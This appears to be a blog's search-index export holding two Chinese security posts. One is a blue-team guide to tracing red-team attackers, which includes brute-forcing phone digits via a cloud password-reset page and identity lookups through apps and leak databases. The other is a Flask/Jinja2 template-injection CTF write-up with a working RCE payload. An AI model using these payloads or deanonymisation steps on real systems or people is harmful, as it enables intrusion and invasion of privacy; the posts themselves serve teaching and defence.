<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>聊聊溯源反制那些事</title>
    <url>/2023/08/20/%E8%81%8A%E8%81%8A%E6%BA%AF%E6%BA%90%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
    <content><![CDATA[<h1 id="聊聊蓝队溯源那些事"><a href="#聊聊蓝队溯源那些事" class="headerlink" title="聊聊蓝队溯源那些事"></a>聊聊蓝队溯源那些事</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    红蓝对抗中，由于业务需求，蓝队常常需要对红队进行溯源反制，而作为蓝队人员，特别是驻场人员，大多数都是盯着设备看，如果未被红队攻入，能够获取的信息十分有限，作为曾经有幸参加过某市hvv的红队选手以及做过一阵子应急工作的小菜鸡来说，最近参加攻防演练中负责研判+溯源+反制工作，在对红队进行溯源时，遇到了很多烦心事，发现很多地方特别麻烦，特此来聊聊这次工作中，我的一些思考。当然鉴于篇幅有限，本文我们只讨论在红队信息搜集，打点过程中我们能够做的事，对于打穿之后的日志分析，应急响应，溯源挽回等，我会在后续继续聊。</p>
<p>​                                                                                                                                                                                                 –B1uewhit4</p>
<h2 id="1-从哪里开始？"><a href="#1-从哪里开始？" class="headerlink" title="1.从哪里开始？"></a>1.从哪里开始？</h2><p>​    我一直认为网络的攻防对抗就像我们现实中的警匪博弈游戏，只有了解敌方想要干什么，才能更好的去对地方进行分析追踪，就像警方办案，会去分析坏人的心理，溯源工作的核心其实就是还原攻击者的攻击路径（应急响应），然后从攻击者的蛛丝马迹中将其抓获。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">“知彼知己，百战不殆；不知彼而知己，一胜一负；不知彼不知己，每战必殆。”</span><br><span class="line">																			     	--《孙子兵法·谋攻篇》</span><br></pre></td></tr></table></figure></div>

<p>​    红队Red team就像一个小偷，在获取攻击目标只会当然会对攻击者进行信息搜集，这是很多方面的，我们这里不谈工具（水泽，enscan,oneforall，subdomain等等）的使用，谈谈这些工具是用来做啥的，其实质就是调动各类网站的接口，搜集与目标相关的数据，子域名等也通过暴力枚举的方式去做的。此外，也会去尝试发现目标的暴露面，比如说github上的敏感信息泄露，以及一些敏感文件泄露，这里很多都是被动的，当然，当他们行动起来的时候，我们往往可以发现蛛丝马迹。接下来，就从各个阶段来说说我们能发现什么，可以怎么做。</p>
<h2 id="2-从攻击者脚印的角度考虑"><a href="#2-从攻击者脚印的角度考虑" class="headerlink" title="2.从攻击者脚印的角度考虑"></a>2.从攻击者脚印的角度考虑</h2><p>​    为了获取信息，或者想办法进入目标内网，可谓是无所不用其极（无人机，U盘等等），这里我们不谈安全意识，主要是思考我们能从这个过程中发现什么？</p>
<p>​    其实对于被动的信息搜集，从暴露面的角度来说我们是没有办法得到信息的。但是对于主动的搜集，诸如加群，敏感文件的访问，社工等等，那么这样的话我们就能够抓到其的一些尾巴了。</p>
<p>​    最简单的是一些集团内部会有工作群，群里面往往有这个公司的一些敏感信息，这些文件可能暴露一些弱密码，以及隐私信息。比如QQ这种，如果不注意可能就会有人加进来，</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230819213500095.png" data-fancybox="group" data-caption="image-20230819213500095" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230819213500095.png" alt="image-20230819213500095" title="image-20230819213500095"></a></p>
<p> 如果在演练期间，突然有陌生人加进来，那么这个时候我们就要注意了。这时候你可能会说，我是红队我又不二，我可以开个小号来加啊，确实，如果红队利用小号加，那么我们能获得的信息就会少之又少，但是这也降低了红队混进来的成功率，毕竟一个一级小号，管理往往不会放，这时候可以利用一些社工的方法，或者去某灰机，某些bot从此入手获得该账号的一些蛛丝马迹。</p>
<p>​    对于社工内部员工，这个只能从加强员工安全意识角度出发了，这个没办法说啥，在安全的系统毕竟也往往无法抵抗人性的弱点。</p>
<p>​    另外，我们可能会从监控设备等等发现一些安全告警事件，这时候我们能够获得一些扫描工具的探测日志，但是这里面我们最多只能得到一些扫描工具的指纹，除了攻击者的IP我们其实能够获得到的信息少之又少，此外，这个IP极有可能还会是攻击者的一个跳板机，肉鸡，这样我们想把真正的红队抓出来就更难了，如何从IP入手，我们放到攻击阶段来说，毕竟红队进行攻击尝试的时候效果跟这个是一样的。</p>
<p>​    还有一点，我觉得说的应该是一些敏感文件的访问，红队在进行信息搜集的时候，往往会用谷歌语法搜索目标站点的敏感文件暴露</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230819221440927.png" data-fancybox="group" data-caption="image-20230819221440927" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230819221440927.png" alt="image-20230819221440927" title="image-20230819221440927"></a></p>
<p>​    这些文件基本过了时限就很少有人访问，如果发现有人对这些敏感文件的访问行为，那么这个IP极有可能是攻击者的IP，并且这种行为往往是不会通过跳板机来操作的，如果发现此类行为，可以重点关注。</p>
<p>​    有的时候，我们也会收到钓鱼邮件，或者诱骗你点一些链接啥的，这时候，我们如何从钓鱼邮件里面提取一些东西呢，</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230819222816647.png" data-fancybox="group" data-caption="image-20230819222816647" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230819222816647.png" alt="image-20230819222816647" title="image-20230819222816647"></a></p>
<p>这时候呢，如果是个链接那就很开心了，通过搜集其域名进行溯源。如果没有呢？攻击者可能是一个样本，点了CS立马上限，或者利用这次WPS爆出来的0day给你发个word搞你一下子是吧。链接域名的思路，我们放在后面跟IP一起说，这里我们说如何从样本或者这封邮件获得信息呢？</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230819223436537.png" data-fancybox="group" data-caption="image-20230819223436537" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230819223436537.png" alt="image-20230819223436537" title="image-20230819223436537"></a></p>
<p>查看邮件原文，这里我们能够发现其邮件最先从218这个IP出发的，然后给QQ的邮件服务器，然后再给的我，这样我们就能够获得攻击者的IP以及主机名nuqbq1gut之类的信息。</p>
<p>这里有一个网站能够根据我们输入的邮件头在线分析：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.whatismyip.com/email-header-analyzer/</span><br></pre></td></tr></table></figure></div>

<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820003710258.png" data-fancybox="group" data-caption="image-20230820003710258" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820003710258.png" alt="image-20230820003710258" title="image-20230820003710258"></a>    <a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820003743766.png" data-fancybox="group" data-caption="image-20230820003743766" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820003743766.png" alt="image-20230820003743766" title="image-20230820003743766"></a></p>
<p>那么如果包含一个样本呢？（千万别在本地打开样本）</p>
<p>​    如果是word，excel等文件，如果攻击者疏忽的话，我们可以从文件属性获得一定的信息</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230819224646977.png" data-fancybox="group" data-caption="image-20230819224646977" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230819224646977.png" alt="image-20230819224646977" title="image-20230819224646977"></a></p>
<p>这也能够帮助我们获得蛛丝马迹，如果是其他的木马或者可执行文件，我们可以计算该样本的hash到微步等威胁情报平台获取一些情报信息。</p>
<h2 id="3-只有一个IP的话，如何溯源？"><a href="#3-只有一个IP的话，如何溯源？" class="headerlink" title="3.只有一个IP的话，如何溯源？"></a>3.只有一个IP的话，如何溯源？</h2><p>   首先，在该阶段，我们普遍遇到的比较常态化的情况是我们能够通过数据包，根据payload或者流量特征来确定攻击者的攻击行为，那么此时，我们能够得到的，仅仅为一个IP地址，那么我们就从IP地址入手，来谈谈如何在只有一个IP的情况下进行溯源工作呢?</p>
<p>​    现在各大安全厂商还有微步，sxf,qax等等都有自己的威胁情报平台，最无脑的办法当然是直接把IP丢进去看情报</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230819231831578.png" data-fancybox="group" data-caption="image-20230819231831578" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230819231831578.png" alt="image-20230819231831578" title="image-20230819231831578"></a></p>
<p>这个能够给我们一个比较全的IP的信息，但是在使用过程中我发现，这种方式虽然集成了大量情报，还有师傅们的共享，但是存在两个问题，一个是他不是实时的，可能红队会开一个新的IP来攻击，这样就没有情报，或者信息滞后，这里提供的信息不一定就是全面的正确的，导致我们失去了很多情报，比较好的情况是，我们自己的搜集，外加这些威胁情报平台是最好的，那么我们如何自己去获取IP的情报呢？其实也是一个红队信息搜集的过程。</p>
<p>​     首先，最直观的肯定是空间测绘了，先把IP丢到FOFA,ZOOMEYE去看，然后看该IP有什么资产，注意，在实际的使用过程中，我发现这个方式也存在一定的滞后性，考虑以下情况，这个云服务器，跳板机是新买的，资产测绘都是搜集的上一个或者上上个拥有者的资产信息，这时候，你得到的一些信息也没有用，因为跟这个人无关。这时候我们就只能通过以其人之道还治其人之身，攻击该服务器反制红队，当然啦，我们也得确定了这个IP就是红队的情况下，乱打毕竟也不行。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230819232801101.png" data-fancybox="group" data-caption="image-20230819232801101" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230819232801101.png" alt="image-20230819232801101" title="image-20230819232801101"></a></p>
<p>比如我们在fofa上面可以看到对某恶意IP的资产信息，不过这个信息是04.23搜集的了，我们可能遇到的情况就是，你访问之后，可能网站打不开或者已经迁移了。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230819232943502.png" data-fancybox="group" data-caption="image-20230819232943502" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230819232943502.png" alt="image-20230819232943502" title="image-20230819232943502"></a></p>
<p>比如说访问上述的第一个链接。</p>
<p>对于这种情况，我的建议是结合多个资产测绘平台进行结合分析，尽量尽可能多的获取信息。</p>
<p>除此之外，我们也应该对该IP进行扫描，来消除这种滞后性，这里就不具体展开了。</p>
<p>上面我们说了，威胁情报存在滞后性，或者消息搜集的有限，也会导致我们措施很多机会，这里我们来从手工的角度来说，拿到这个IP我们能够去搜集什么信息吧。</p>
<p>首先，我们能够对该IP进行一个IP反查，我们可以获得这个IP绑定的域名信息</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820000308491.png" data-fancybox="group" data-caption="image-20230820000308491" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820000308491.png" alt="image-20230820000308491" title="image-20230820000308491"></a></p>
<p>当然，也能够看看同站的域名</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820000424657.png" data-fancybox="group" data-caption="image-20230820000424657" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820000424657.png" alt="image-20230820000424657" title="image-20230820000424657"></a></p>
<p>这个其实有两个作用，一个是反制旁站打，还有一个是可能旁站会有信息。</p>
<p>一些IP反查域名的网站：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://tools.ipip.net/ipdomain.php</span><br><span class="line">https://viewdns.info/reverseip/</span><br><span class="line">https://site.ip138.com/</span><br><span class="line">https://dnslytics.com/reverse-ip</span><br></pre></td></tr></table></figure></div>

<p>同站IP：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://stool.chinaz.com/same</span><br><span class="line">https://hackertarget.com/whois-lookup/</span><br><span class="line">https://ipwhois.cnnic.net.cn/</span><br></pre></td></tr></table></figure></div>

<p>IP定位：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://ip.tool.chinaz.com</span><br><span class="line">https://www.cz88.net/</span><br></pre></td></tr></table></figure></div>

<p>此外，如果确定是腾讯云的主机，有一条可以可以帮助我们交叉分析，在腾讯云的找回密码功能，我们可以通过IP获取攻击者手机号的部分特征（从前能暴露7位，现在只能看4位了）</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820002205556.png" data-fancybox="group" data-caption="image-20230820002205556" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820002205556.png" alt="image-20230820002205556" title="image-20230820002205556"></a></p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820002238872.png" data-fancybox="group" data-caption="image-20230820002238872" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820002238872.png" alt="image-20230820002238872" title="image-20230820002238872"></a></p>
<p>这里能够看到，我们能够获得攻击者的手机号一些信息，另外这个接口虽然可以爆破，但是需要爆破7位，这个是很难的，并且每天是有接口使用限制的，建议结合攻击者所在地等更多信息，将手机号的范围缩小，在进行爆破。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820002424653.png" data-fancybox="group" data-caption="image-20230820002424653" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820002424653.png" alt="image-20230820002424653" title="image-20230820002424653"></a></p>
<p>如果成功猜对了，就会变成这样了。</p>
<p>此外，根据攻击者IP绑定的域名，我们可以访问一下该域名，好多攻击者，往往用自己的云服务器绑定个博客啥的，我们可能会有意外收获，，如果是博客的话，那我们就能够获得大量攻击者的信息，此外，我们可以对该域名进行whois，</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820002739344.png" data-fancybox="group" data-caption="image-20230820002739344" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820002739344.png" alt="image-20230820002739344" title="image-20230820002739344"></a></p>
<p>如果域名注册时，注册人没有关注隐私的话，这里就会暴露出注册人的信息。</p>
<p>国内的域名如果能访问，也就是我们访问域名时，没有域名供应商的页面说是没有备案，我们可以查询其ICP备案，可能会有意外收获。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820003130644.png" data-fancybox="group" data-caption="image-20230820003130644" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820003130644.png" alt="image-20230820003130644" title="image-20230820003130644"></a></p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820003337517.png" data-fancybox="group" data-caption="image-20230820003337517" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820003337517.png" alt="image-20230820003337517" title="image-20230820003337517"></a></p>
<p>ICP备案查询</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://beian.miit.gov.cn/#/Integrated/recordQuery</span><br></pre></td></tr></table></figure></div>

<h2 id="4-交叉分析"><a href="#4-交叉分析" class="headerlink" title="4.交叉分析"></a>4.交叉分析</h2><p>​    根据3中的手段，如果一个攻击者比较菜的情况下，基本能够获取到蛛丝马迹，这时候我们可以根据这些基本信息，通过谷歌语法结合搜索引擎获得更多的信息，比如从一个手机号，或者一个人的名字+地域出发，我们往往能扒出很多这个人的相关信息。大多数人都会很喜欢在各个平台用一个ID，我们也可以从ID出发，在各大平台查找其踪迹。当然，实在找不到，也可社工库里面看看，这个比较隐晦，就不展开了。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">领英</span><br><span class="line">知乎</span><br><span class="line">微博</span><br><span class="line">贴吧</span><br><span class="line">github</span><br><span class="line">CSDN</span><br><span class="line">豆瓣</span><br><span class="line">脉脉</span><br><span class="line">公众号</span><br><span class="line">等等</span><br></pre></td></tr></table></figure></div>

<p>​    此外，为了验证正确性，我们可以利用各大APP的添加联系人功能，将攻击者手机号，加入到联系人，什么zfb,wx,某音等里面一把梭，能够帮助我们验证这个人，甚至能够获得这个人的生活信息。能为我们的溯源结果提供强有力的证明。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820004408262.png" data-fancybox="group" data-caption="image-20230820004408262" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820004408262.png" alt="image-20230820004408262" title="image-20230820004408262"></a></p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820004602592.png" data-fancybox="group" data-caption="image-20230820004602592" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202308/image-20230820004602592.png" alt="image-20230820004602592" title="image-20230820004602592"></a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    此次简单的聊了聊如何进行一次简单的溯源，在只有一个IP的情况下，对于反制，或者拿到攻击样本，或者攻击者已经突破等场景，我们在后续聊，其实所谓溯源就是针对于一些有限的信息，查找其他关联的信息，扩大信息面，毕竟互联网是有记忆的，想要完全隐身还是很难的。此外，在溯源过程中，我们也要注意对个人身份的隐藏，该上代理上代理，什么主机名啥的，该改就改，想想红队怎么来，你就怎么来，防止被红队钓鱼，泄露更多地个人信息，被红队进一步反制（有很多先例了）。</p>
<p>​    还有一点我想谈谈就是对于反制的一些说法，其实我们拿到IP之后，搜集点信息，就能看的差不多，这个IP是个肉鸡还是真正的红队，比如拿到一个IP，绑了个某某公司的域名，然后进去一看，弱密码，未授权访问一大堆，连漏洞都不用测，十有八九就是个肉鸡，这种情况下，你说反制有没有意义呢，感觉能做的就是进入看看日志，通过看攻击者怎么进来的，然后再往前面溯，这就涉及到攻击者突破的事了，不过服务器也不是我们自己的，或者我们防守的资产，这种情况还是不建议大家去攻击人家的肉鸡了。</p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>蓝队溯源</category>
      </categories>
      <tags>
        <tag>blue team</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析FLASK模板注入</title>
    <url>/2021/10/01/%E6%B5%85%E6%9E%90FLASK%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="浅析FLASK模板注入"><a href="#浅析FLASK模板注入" class="headerlink" title="浅析FLASK模板注入"></a>浅析FLASK模板注入</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>​                最近搞学术之余又捡起了老本行WEB，然后刷了一些CTF题，发现了一个自己之前没有触碰的点，模板注入，感觉好像命令注入的玩意，看看了什么原理，利用方法，然后这里呢，也单独拎出来来细细的说一说。</p>
<h2 id="1-问题出现"><a href="#1-问题出现" class="headerlink" title="1.问题出现"></a>1.问题出现</h2><p>​    这个问题起源于一个CTF题，题目在攻防世界上CTF提高篇，有一个Web_python_template_injection,名称言简意赅，模板注入，打开之后<a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008173039367.png" data-fancybox="group" data-caption="image-20211008173039367" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008173039367.png" alt="image-20211008173039367" title="image-20211008173039367"></a></p>
<p>看不到任何有价值的信息，Ctrl+U也没啥，没价值。</p>
<p>只能抓个包看看了，到底是哪个框架，哪个组件的利用。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008173541573.png" data-fancybox="group" data-caption="image-20211008173541573" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008173541573.png" alt="image-20211008173541573" title="image-20211008173541573"></a></p>
<p>可以看到这是Flsak的一个组件，应该是flask的模板注入，那么接下来可以看看利用什么的了。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008173645929.png" data-fancybox="group" data-caption="image-20211008173645929" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008173645929.png" alt="image-20211008173645929" title="image-20211008173645929"></a></p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008173730343.png" data-fancybox="group" data-caption="image-20211008173730343" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008173730343.png" alt="image-20211008173730343" title="image-20211008173730343"></a></p>
<p>代码被执行了，说明确实问题存在。</p>
<p>那么下面就来分析分析这个漏洞，看看这个事的利用吧。</p>
<h2 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2.漏洞分析"></a>2.漏洞分析</h2><p> 所谓模板注入漏洞，这个玩意我们一般叫做SSIT（Server-Side Template Injection）具体漏洞成因，还是用户控制了，参数了，然后服务端没有对其输入进行转义过滤，然后呢python内置的一些函数能够被用来利用，从而RCE，XSS利用这种。</p>
<p>还是用DEMO说话吧，</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.args.get(<span class="string">'name'</span>, <span class="string">'guest'</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">"Hello "</span> + name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(</span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Jinja 2是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的</span><br><span class="line"></span><br><span class="line">Jinja2 是 Flask 框架的一部分。Jinja2 会把模板参数提供的相应的值替换了 &#123;&#123;…&#125;&#125; 块</span><br><span class="line"></span><br><span class="line">Jinja2 模板同样支持控制语句，像在 &#123;%%&#125; 块中</span><br></pre></td></tr></table></figure></div>

<p>这个是jinja2的一些介绍，就可以理解为一个模板的语言解释器，这个不多说了，这玩意主要也是框架的事，我们主要说说这个漏洞。这个代码是个很经典的漏洞，一般vulhub什么的或者搭建docker环境复现都是这个代码。</p>
<p>问题出现在我们传入的name中，然后传入到Template中直接渲染利用了，当然也有修复方法，就是对于传入name进行转义或者编码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t = Template(<span class="string">"Hello &#123;&#123;n&#125;&#125;"</span> )</span><br><span class="line"><span class="keyword">return</span> t.render(n=name)</span><br></pre></td></tr></table></figure></div>

<p>当然你其他方法也可以，只要叫这个参数不在能够触发python的执行就行，在这里是用户的输入不能接触到这个渲染的执行。</p>
<p>所以嘛，既然这里存在这个漏洞，那就存在利用了。</p>
<h2 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h2><p>我们观察代码，这个东西是被放到解释器里面给渲染执行了，这时候你肯定说，那我们直接简单粗暴，os.system,os.popen，eval,exec,但是这里我们想想啊，你调用这个得用Python引入os把，但是前面代码根本就没有引入，那我们没法调用啊，那怎么办？当然有利用方法，这个方法还是归因于python语言的特性，我们知道py是基于对象的，每一对象的定义肯定会涉及到很多的类涉及到很多继承，然后创建一个对象，就可以去回溯他的继承的类的方法，如果他继承的这个类，村尊在我们上述说的这些函数，那么就可以执行系统命令，从而进行攻击。</p>
<p>这里上一张图，来说明这个漏洞构造payload的py端原理（这个东西也可以用来玩逃逸）</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008192127904.png" data-fancybox="group" data-caption="image-20211008192127904" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008192127904.png" alt="image-20211008192127904" title="image-20211008192127904"></a></p>
<p>我们先来看看py的魔术方法，也就是我们用来查看对象其种类的方法。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__class__ 返回类型所属的对象 </span><br><span class="line">__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 </span><br><span class="line">__base__ 返回该对象所继承的基类 // __base__和__mro__都是用来寻找基类的 </span><br><span class="line">__subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表 </span><br><span class="line">__init__ 类的初始化方法 </span><br><span class="line">__globals__ 对包含函数全局变量的字典的引用</span><br><span class="line">__builtin__ 内建函数，python中可以直接运行一些函数，例如int(),list()等等，这些函数可以在__builtins__中可以查到。查看的方法是dir(__builtins__)</span><br></pre></td></tr></table></figure></div>

<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008183947904.png" data-fancybox="group" data-caption="image-20211008183947904" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008183947904.png" alt="image-20211008183947904" title="image-20211008183947904"></a></p>
<p>我们可以从图中看到输入</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__base__.subclasses__()</span><br></pre></td></tr></table></figure></div>

<p>所得到的其可以引用的类的列表，我们的目标是找到一个存在os调用的类，然后构造输入从而达到利用。那么如何找呢，这里提供一个通用的payload</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">""</span>.__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("terminal命令").read()'</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></div>

